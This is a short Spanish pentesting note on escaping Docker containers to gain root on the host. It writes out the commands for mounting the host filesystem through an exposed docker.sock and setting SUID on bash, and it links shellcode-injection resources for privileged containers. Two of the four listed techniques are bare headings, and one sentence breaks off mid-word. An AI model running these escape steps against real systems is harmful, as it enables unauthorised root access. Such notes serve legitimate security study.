#Escalada #DockerBreakout
###### Definición
Son técnicas para abusar de Docker con el objetivo de elevar nuestros privilegios de usuario y conseguir escapar del contenedor hacia la maquina host.

###### Explotación
Usaremos cuatro técnicas diferentes:
-  Uso de monturas en el despliegue de contenedores para acceder a archivos privilegiados del sistema host.
		Cuando nosotros llamamos a Docker hay un recurso en el sistema llamado Unix Socket File que permite comunicarse con el demonio(daemon) de Docker que se ubica en `/var/run/docker.sock`, cuando el demonio esta activo nos permite interactuar con Docker.
		Esto nos permite que una vez ganado acceso  a un sistema e identificado un servicio corriendo en un Docker y vemos que tiene el socket de Docker y nos deja crear contenedores podemos crear un nuevo contenedor jugando con monturas.
		Crearemos un nuevo contenedor por ejemplo: `docker pull ubuntu:latest`
		Replicamos la raíz de la maquina host con monturas `docker run --rm -dit -v /:/mnt/root --name ubuntuServer ubuntu`
		Ejecutamos el contenedor `docker exec -it ubuntuServer bash`
		Una vez nos encontremos dentro del contenedor si navegamos a `/mnt/root/bin` y le damos permisos de SUID a bash `chmod u+s bash` 
		En la maquina host usando el comando `bash -p` obtendremos una shell como root.

- Despliegue de contenedores PID y PRIVILEGED
		Si el contenedor ha sido levantado con `--pid=host` o `--privileged` podemos ver todos los procesos de la maquina host en la maquina Docker, si al ver los procesos con `ps -faux` y vemos algun proceso ejecutando como root se puede inyectar un shellcode a través del proceso para que cree un nuevo subproceso y este ejecute un comando.
		La siguien
		https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c 
		https://www.exploit-db.com/exploits/41128

- Uso de Portainer

- Abuso de API de Docker (port: 2375)